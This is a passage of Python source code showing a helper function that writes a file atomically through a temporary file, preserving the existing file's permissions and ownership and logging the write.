### atomic write/delete helpers
   600	def write_file(
   601	    filename: str, content: str, mode: Optional[int] = None
   602	) -> None:
   603	    """Write content to the provided filename encoding it if necessary.
   604	
   605	    We preserve the file ownership and permissions if the file is present
   606	    and no mode argument is provided.
   607	
   608	    @param filename: The full path of the file to write.
   609	    @param content: The content to write to the file.
   610	    @param mode: The filesystem mode to set on the file.
   611	    """
   612	    tmpf = None
   613	    is_file_present = os.path.isfile(filename)
   614	    if is_file_present:
   615	        file_stat = pathlib.Path(filename).stat()
   616	        f_mode = stat.S_IMODE(file_stat.st_mode)
   617	        if mode is None:
   618	            mode = f_mode
   619	
   620	    elif mode is None:
   621	        mode = 0o644
   622	    try:
   623	        os.makedirs(os.path.dirname(filename), exist_ok=True)
   624	        tmpf = tempfile.NamedTemporaryFile(
   625	            mode="wb", delete=False, dir=os.path.dirname(filename)
   626	        )
   627	        LOG.debug(
   628	            "Writing file %s atomically via tempfile %s", filename, tmpf.name
   629	        )
   630	        tmpf.write(content.encode("utf-8"))
   631	        tmpf.flush()
   632	        tmpf.close()
   633	        os.chmod(tmpf.name, mode)
   634	        if is_file_present:
   635	            os.chown(tmpf.name, file_stat.st_uid, file_stat.st_gid)
   636	        os.rename(tmpf.name, filename)
   637	    except Exception as e:
   638	        if tmpf is not None:
   639	            os.unlink(tmpf.name)
   640	        raise e
   641	
